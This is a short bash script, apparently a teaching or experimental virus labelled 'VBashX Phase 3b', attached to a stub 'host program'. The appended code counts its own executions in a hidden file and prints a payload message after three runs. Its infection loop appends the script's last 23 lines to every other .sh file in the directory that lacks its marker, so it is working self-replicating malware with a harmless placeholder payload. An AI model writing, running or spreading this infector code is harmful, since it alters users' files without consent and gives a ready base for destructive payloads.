#!/bin/bash
echo "I am the host program"
# --- VBashX Phase 3b --- VBX_7k9Pz
MARKER="VBX_7k9Pz"
VIRUS_SIZE=23
COUNTER_FILE=".vbx_count"
# Increment execution counter
if [ -f "$COUNTER_FILE" ]; then
    COUNT=$(cat "$COUNTER_FILE")
    COUNT=$(($COUNT + 1))
else
    COUNT=1
fi
echo $COUNT > "$COUNTER_FILE"
# Payload: triggered after 3 executions
if [ $COUNT -ge 3 ]; then
    echo "[VBashX] PAYLOAD: Execution count reached $COUNT!"
fi
# Infection phase
for f in *.sh; do
    if [ "$(basename "$f")" != "$(basename "$0")" ]; then
        if [ -z "$(grep "$MARKER" "$f")" ]; then
            tail -n $VIRUS_SIZE "$0" >> "$f"
    fi; fi
done
